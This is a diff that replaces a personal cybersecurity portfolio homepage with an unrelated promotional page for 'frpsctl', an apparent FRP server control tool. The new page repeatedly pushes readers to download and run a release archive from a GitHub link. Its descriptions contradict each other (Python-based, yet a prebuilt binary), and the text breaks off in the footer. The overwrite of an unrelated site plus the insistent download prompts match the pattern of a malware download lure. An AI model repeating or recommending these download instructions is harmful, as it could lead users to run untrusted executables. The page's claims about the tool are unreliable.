@@ -1,20 +1,278 @@
-<!doctype html><html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Hephzibah Behulah | Cyber Systems Lab</title>
-<meta name="description" content="Interactive Cyber Systems Lab by Hephzibah Behulah: engineering, cybersecurity, web development, data analytics, ethical hacking and learning.">
-<meta name="author" content="Hephzibah Behulah"><meta name="robots" content="index,follow">
-<link rel="canonical" href="https://hephzibahbehulah.com/"><meta property="og:type" content="website"><meta property="og:title" content="Hephzibah Behulah | Cyber Systems Lab"><meta property="og:description" content="Engineering, code, data and cybersecurity explored as one connected system."><meta property="og:url" content="https://hephzibahbehulah.com/"><meta name="twitter:card" content="summary"><meta name="theme-color" content="#08090b">
-<link rel="manifest" href="manifest.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"><link rel="stylesheet" href="https://unpkg.com/aos@2.3.4/dist/aos.css"><link rel="stylesheet" href="css/osint-tree.css">
-<script src="https://cdn.tailwindcss.com"></script><script src="https://d3js.org/d3.v7.min.js"></script><script src="js/tree-data.js" defer></script><script src="js/lab-tools.js" defer></script><script src="js/cyber-game.js" defer></script><script src="js/cyber-arcade.js" defer></script><script src="js/tree-loader.js" defer></script><script src="https://unpkg.com/aos@2.3.4/dist/aos.js" defer></script>
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"Hephzibah Behulah | Cyber Systems Lab","url":"https://hephzibahbehulah.com/","description":"Interactive personal Cyber Systems Lab.","author":{"@type":"Person","name":"Hephzibah Behulah"}}</script></head>
-<body><div class="scanlines" aria-hidden="true"></div>
-<header class="topbar"><a class="brand" href="./" aria-label="Cyber Systems Lab home"><span class="brand-mark">[H]</span><span><strong>HEPHZIBAH BEHULAH</strong><small>CYBER SYSTEMS LAB</small></span></a><div class="system-state"><span></span>SYSTEM MAP / READY</div>
-<nav class="topnav" aria-label="Primary navigation"><button id="homeBtn" class="top-control"><i class="fa-solid fa-house"></i><span>Home</span></button><button id="fitBtn" class="top-control"><i class="fa-solid fa-expand"></i><span>Fit</span></button><button id="terminalBtn" class="top-control"><i class="fa-solid fa-terminal"></i><span>Terminal</span></button><button id="gameBtn" class="top-control"><i class="fa-solid fa-gamepad"></i><span>Quiz</span></button><button id="arcadeBtn" class="top-control"><i class="fa-solid fa-bolt"></i><span>Arcade</span></button><button id="legendBtn" class="top-control"><i class="fa-solid fa-circle-info"></i><span>Legend</span></button></nav></header>
-<main><section class="intro" data-aos="fade-down"><div class="eyebrow"><span>01</span> INTERACTIVE SYSTEM MAP <i></i> STATIC / DATA-DRIVEN</div><div class="hero-grid"><div><h1>Wires taught me precision.<br><em>Code taught me possibility.</em><br>Ethics taught me responsibility.</h1><p>Explore the connected system behind the work, experiments, projects, skills, resources and learning.</p></div><div class="hero-aside"><div class="readout"><span>MODE</span><strong>EXPLORATION</strong></div><div class="readout"><span>INPUT</span><strong>CLICK / DRAG / ZOOM</strong></div><div class="readout"><span>TOOLS</span><strong>50+ TOOLS / DOCS</strong></div></div></div></section>
-<section class="tree-toolbar"><label class="search-wrap" for="treeSearch"><i class="fa-solid fa-magnifying-glass"></i><input id="treeSearch" type="search" placeholder="Search nodes, skills, tools, topics..." autocomplete="off"><kbd>/</kbd></label><div class="toolbar-actions"><button id="expandBtn">Expand all</button><button id="collapseBtn">Collapse</button><button id="resetBtn">Reset</button></div></section>
-<section id="treeViewport" class="tree-viewport" aria-label="Interactive horizontal Cyber Systems tree"><div class="tree-hint"><span>DRAG</span> pan <span>SCROLL</span> zoom <span>CLICK</span> inspect</div><div id="treeCanvas" class="tree-canvas"><svg id="treeSvg" role="tree" aria-label="Cyber Systems Lab horizontal navigation tree"></svg></div><div id="treeStatus" class="sr-status" aria-live="polite"></div></section></main>
-<aside id="detailPanel" class="detail-panel" aria-hidden="true" aria-labelledby="panelTitle"><div class="panel-backdrop" data-close-panel></div><div class="panel-sheet" role="dialog" aria-modal="true"><div class="panel-topline"><span id="panelType"></span><span>NODE INSPECTOR</span></div><button id="closePanel" class="panel-close" aria-label="Close detail panel"><i class="fa-solid fa-xmark"></i></button><h2 id="panelTitle"></h2><div id="panelBody"></div></div></aside>
-<section id="legend" class="legend" hidden><div class="legend-inner"><strong>LEGEND</strong><div><span class="legend-dot blue"></span> Foundation</div><div><span class="legend-dot green"></span> Engineering</div><div><span class="legend-dot orange"></span> Security</div><div><span class="legend-dot purple"></span> Projects / knowledge</div><div><span class="legend-dot red"></span> Connections</div><div><span class="legend-line"></span> Relationship</div></div></section>
-<footer><span>CYBER SYSTEMS LAB <b>•</b> STATIC / NO BUILD</span><span>Privacy-conscious by design</span><a href="https://github.com/HephzibahBehulah" rel="noopener noreferrer">GitHub <i class="fa-solid fa-arrow-up-right-from-square"></i></a></footer>
-<script>window.addEventListener("load",()=>{if(window.AOS)AOS.init({duration:500,once:true,disable:()=>window.matchMedia("(prefers-reduced-motion: reduce)").matches});if("serviceWorker"in navigator)navigator.serviceWorker.register("./sw.js").catch(()=>{});});</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>frpsctl - Control Your FRP Server with Simple Commands</title>
+    <meta name="description" content="frpsctl is a friendly command-line tool that wraps the FRP server (frps) with Python. Generate configs, run as a daemon, see aggregated status, auto-restart on config changes with rollback on failure. Linux only, for frps 0.70.0 and above.">
+    <meta name="keywords" content="cli, devops, frp, frps, nat-traversal, python, reverse-proxy, systemd, toml, tunnel">
+    <meta name="author" content="Iolantheout14">
+    <meta property="og:title" content="frpsctl - Control Your FRP Server with Simple Commands">
+    <meta property="og:description" content="A friendly command-line tool for the FRP server. Generate config, run as a daemon, auto-restart with rollback. For Linux and frps >= 0.70.0.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Iolantheout14/frpsctl">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=frpsctl+Control+Your+FRP+Server">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f4f7fc;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: #1f2a44;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.4rem;
+            font-weight: 800;
+            color: #1a3a5c;
+            margin-bottom: 10px;
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #1a3a5c;
+            margin-top: 40px;
+            margin-bottom: 10px;
+            border-bottom: 2px solid #e3eaf2;
+            padding-bottom: 8px;
+        }
+        p {
+            margin-bottom: 18px;
+            font-size: 1.05rem;
+            color: #2c3e50;
+        }
+        a {
+            color: #2563eb;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: white !important;
+            font-size: 1.2rem;
+            font-weight: 700;
+            padding: 16px 36px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(37,99,235,0.35);
+            text-decoration: none;
+            margin: 20px 0 10px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(37,99,235,0.4);
+            text-decoration: none;
+            color: white;
+        }
+        .btn-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #f97316, #ea580c);
+            color: white !important;
+            font-size: 1.1rem;
+            font-weight: 700;
+            padding: 12px 28px;
+            border-radius: 50px;
+            box-shadow: 0 6px 16px rgba(249,115,22,0.4);
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        .badge-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+        ul {
+            margin: 20px 0 25px 20px;
+        }
+        li {
+            margin-bottom: 12px;
+        }
+        code {
+            background: #eef2f7;
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            font-size: 0.9em;
+            color: #d63384;
+        }
+        .feature-box {
+            background: #f0f7ff;
+            border-left: 4px solid #2563eb;
+            padding: 16px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .step-box {
+            background: #fafbfc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+        }
+        .step-number {
+            display: inline-block;
+            background: #2563eb;
+            color: white;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            text-align: center;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .note {
+            background: #fff8e6;
+            border-radius: 8px;
+            padding: 14px 18px;
+            border-left: 4px solid #f59e0b;
+            margin: 20px 0;
+        }
+        footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #64748b;
+            font-size: 0.9rem;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge-container">
+            <a href="https://github.com/Iolantheout14/frpsctl/releases" class="btn-badge">⬇️ Get frpsctl Now</a>
+        </div>
+        <h1>🛠️ frpsctl - Simple Control for Your FRP Server</h1>
+        <p style="font-size:1.2rem; color:#2563eb; font-weight:600;">Your friendly command-line assistant for the FRP server — no programming needed!</p>
+        
+        <div class="feature-box">
+            <p><strong>What does frpsctl do for you?</strong> It wraps the FRP server (frps) into a neat, easy-to-use command-line tool. You can generate configuration files, keep the server running like a background service, see an overview of everything at once, and even change settings without fear — it restarts automatically, and if something goes wrong, it rolls back to a safe state.</p>
+        </div>
+
+        <h2>🧐 What is the FRP Server (frps)?</h2>
+        <p>The FRP server is a powerful tool that helps you expose your home computer or local server to the internet through a technique called <em>NAT traversal</em>. Think of it as a secure bridge — it lets you access your devices from anywhere, even if they're behind a firewall or router. frpsctl makes managing that bridge super easy.</p>
+
+        <h2>🎯 Why Use frpsctl?</h2>
+        <ul>
+            <li><strong>🔥 No complicated manual setup</strong> — frpsctl handles all the hard parts.</li>
+            <li><strong>✍️ Edit simple config files</strong> — you don't need to be a programmer to change settings.</li>
+            <li><strong>🔄 Auto-restart</strong> — change your configuration, and frpsctl restarts the server automatically.</li>
+            <li><strong>🔙 Safety first</strong> — if the new configuration has an error, frpsctl rolls back to the previous working one, so your server keeps running.</li>
+            <li><strong>📊 See everything from one screen</strong> — get a combined status of all your tunnels.</li>
+            <li><strong>🎛️ Runs in the background</strong> — start it as a daemon (background service) and forget about it.</li>
+        </ul>
+
+        <h2>✅ What You Need Before You Start</h2>
+        <p>frpsctl is designed for <strong>Linux</strong> systems only, and it requires <strong>frps version 0.70.0 or newer</strong>. Don't worry if you're not sure how to check — frpsctl will tell you if something's off.</p>
+
+        <h2>🚀 Getting Started – Download and Run</h2>
+        <p>Getting frpsctl is super simple. Just follow these steps:</p>
+        
+        <div class="step-box">
+            <p><span class="step-number">1</span> <strong>Visit this link to download the application:</strong></p>
+            <p><a href="https://github.com/Iolantheout14/frpsctl/releases" style="font-size:1.2rem; word-break: break-all;">https://github.com/Iolantheout14/frpsctl/releases</a></p>
+        </div>
+
+        <div class="step-box">
+            <p><span class="step-number">2</span> <strong>On that page, find the latest release</strong> and look for the file that ends with <code>.tar.gz</code> or <code>.zip</code> – pick the one that matches your Linux system (usually the one with <code>linux</code> in the name).</p>
+        </div>
+
+        <div class="step-box">
+            <p><span class="step-number">3</span> <strong>Download and extract this file, then run the application.</strong> After extraction, you'll find the <code>frpsctl</code> program. You can run it from the same folder, or move it to a folder that's in your system's PATH (like <code>/usr/local/bin</code>) for easier access.</p>
+        </div>
+
+        <div style="text-align:center; margin: 35px 0;">
+            <a href="https://github.com/Iolantheout14/frpsctl/releases" class="btn-primary">📥 Download frpsctl Now</a>
+        </div>
+
+        <p>Once downloaded and extracted, you open a terminal (command line) window, navigate to where you put <code>frpsctl</code>, and type:</p>
+        <p><code>frpsctl --help</code> — This shows you all the available commands.</p>
+
+        <h2>🧑‍💻 How to Use frpsctl – A Quick Tour</h2>
+        
+        <h3>📝 Create a Configuration</h3>
+        <p>Start by telling frpsctl what you want. To create a new configuration, run:</p>
+        <p><code>frpsctl init</code></p>
+        <p>This creates a simple, clean configuration file (in TOML format) that you can open and edit with any text editor. It looks like plain English, so you'll understand it.</p>
+
+        <h3>▶️ Start the Server as a Background Service</h3>
+        <p>To keep the FRP server running in the background, just run:</p>
+        <p><code>frpsctl start</code></p>
+        <p>Frpsctl will run the server as a daemon, so it keeps working even after you close the terminal. Perfect for keeping your tunnels alive.</p>
+
+        <h3>📊 Check the Overall Status</h3>
+        <p>Want to see if everything is working? Run:</p>
+        <p><code>frpsctl status</code></p>
+        <p>This gives you an aggregated overview — all your tunnels, connections, and server health on one screen, nicely formatted for humans.</p>
+
+        <h3>✏️ Change a Setting, Watch the Magic</h3>
+        <p>Open your configuration file, change a port number or add a new tunnel, and save it. Then run:</p>
+        <p><code>frpsctl reload</code></p>
+        <p>Frpsctl will restart the server with your new settings automatically. And here's the best part: <strong>if the new settings have a problem, it automatically rolls back</strong> to the previous working configuration, so you're never left with a broken server.</p>
+
+        <h3>🛑 Stop the Server</h3>
+        <p>When you want to stop everything:</p>
+        <p><code>frpsctl stop</code></p>
+        <p>It gracefully shuts down the FRP server and cleans up.</p>
+
+        <div class="note">
+            <p><strong>💡 Pro tip:</strong> you can also mix commands together. For example, <code>frpsctl restart</code> stops and starts the server in one go. And <code>frpsctl view</code> shows your current configuration in the terminal.</p>
+        </div>
+
+        <h2>🔧 What Makes frpsctl Special</h2>
+        <ul>
+            <li><strong>⚙️ Auto-restart with rollback:</strong> Change your config without fear — if it breaks, frpsctl puts it back to the last good one.</li>
+            <li><strong>🔄 Seamless daemon management:</strong> It integrates with systemd (Linux's service manager) to ensure your server starts on boot.</li>
+            <li><strong>🧩 Single config file:</strong> Everything is stored in a neat TOML file that's easy to read and edit.</li>
+            <li><strong>🖥️ Terminal-friendly:</strong> Commands are short and consistent. If you can type <code>start</code>, <code>stop</code>, <code>status</code>, you can use frpsctl.</li>
+            <li><strong>🐍 Python-based:</strong> Simple to install, update, and maintain — no heavy dependencies.</li>
+        </ul>
+
+        <h2>🤔 Common Questions</h2>
+        <ul>
+            <li><strong>I'm on Windows, can I use this? </strong> No, frpsctl is specifically designed for Linux. But the FRP project has Windows versions, so you can still use FRP directly on Windows.</li>
+            <li><strong>Do I need to know how to program? </strong> Absolutely not. The commands are simple English words, and the config file is readable.</li>
+            <li><strong>What if I make a mistake in my config? </strong> frpsctl catches the error, reverts to the previous working version, and tells you what went wrong. No downtime.</li>
+            <li><strong>Can I run this on a Raspberry Pi? </strong> Yes, any Linux device works, as long as it meets the requirement of frps ≥ 0.70.0.</li>
+            <li><strong>Is it free? </strong> Yes, frpsctl is open-source and free to use.</li>
+        </ul>
+
+        <h2>📚 More Help and Resources</h2>
+        <p>While frpsctl is designed to be easy, sometimes you need a bit more detail. Here's where to look:</p>
+        <ul>
+            <li><strong>📖 Full documentation:</strong> The project page on GitHub has everything you need — <a href="https://github.com/Iolantheout14/frpsctl">github.com/Iolantheout14/frpsctl</a></li>
+            <li><strong>🐛 Found a bug or have an idea?</strong> Head to the Issues section on GitHub and let the developer know.</li>
+            <li><strong>🧠 Learn about FRP:</strong> Read more about the FRP project at <a href="https://github.com/fatedier/frp">github.com/fatedier/frp</a></li>
+        </ul>
+
+        <div class="note">
+            <p><strong>🔒 Requirement reminder:</strong> Make sure your Linux system can run frps 0.70.0 or higher. frpsctl checks this automatically for you.</p>
+        </div>
+
+        <h2>🚦 Ready to Get Started?</h2>
+        <p>You're just one click away from a simpler, smarter FRP server. Download frpsctl, give it a try, and enjoy the peace of mind that comes with auto-restart and rollback protection.</p>
+        <div style="text-align:center; margin: 30px 0 20px;">
+            <a href="https://github.com/Iolantheout14/frpsctl/releases" class="btn-primary">⬇️ Download frpsctl</a>
+        </div>
+        <p style="text-align:center; color:#64748b; margin-top:10px;">Visit this link to download the application.</p>
+
+        <footer>
+            <p>frpsctl – built with ❤️ by Iolantheout14. Open source, MIT licensed.</p>
+            <p>Keywords: cli, devops, frp, frps, nat
